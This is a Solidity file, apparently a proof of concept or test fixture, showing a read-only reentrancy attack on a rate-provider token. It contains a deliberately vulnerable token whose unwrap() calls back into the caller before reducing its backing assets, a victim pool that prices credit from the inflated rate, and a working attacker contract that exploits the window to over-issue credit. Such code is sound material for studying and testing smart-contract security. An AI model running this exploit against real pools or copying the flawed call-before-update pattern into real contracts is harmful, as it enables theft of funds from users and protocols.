// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IRateProviderCallback {
    function onUnwrap() external;
}

contract VulnerableRateProviderToken {
    mapping(address => uint256) public shares;
    uint256 public totalSupply;
    uint256 public backingAssets;

    function seed(address user, uint256 userShares, uint256 backing) external {
        shares[user] = userShares;
        totalSupply = userShares;
        backingAssets = backing;
    }

    function getRate() external view returns (uint256) {
        return backingAssets * 1e18 / totalSupply;
    }

    function unwrap(uint256 shareAmount) external {
        shares[msg.sender] -= shareAmount;
        totalSupply -= shareAmount;

        // Reentrancy window: rate is inflated because backingAssets is not reduced.
        IRateProviderCallback(msg.sender).onUnwrap();

        backingAssets -= shareAmount;
    }
}

contract VictimPoolUsingRateProvider {
    VulnerableRateProviderToken public immutable token;
    mapping(address => uint256) public credit;

    constructor(VulnerableRateProviderToken token_) {
        token = token_;
    }

    function issueCredit(uint256 wrappedAmount) external {
        credit[msg.sender] += wrappedAmount * token.getRate() / 1e18;
    }
}

contract RateProviderRORAttacker is IRateProviderCallback {
    VulnerableRateProviderToken public token;
    VictimPoolUsingRateProvider public pool;

    function attack(VulnerableRateProviderToken token_, VictimPoolUsingRateProvider pool_) external {
        token = token_;
        pool = pool_;
        token.unwrap(token.shares(address(this)) / 2);
    }

    function onUnwrap() external override {
        pool.issueCredit(token.shares(address(this)));
    }
}
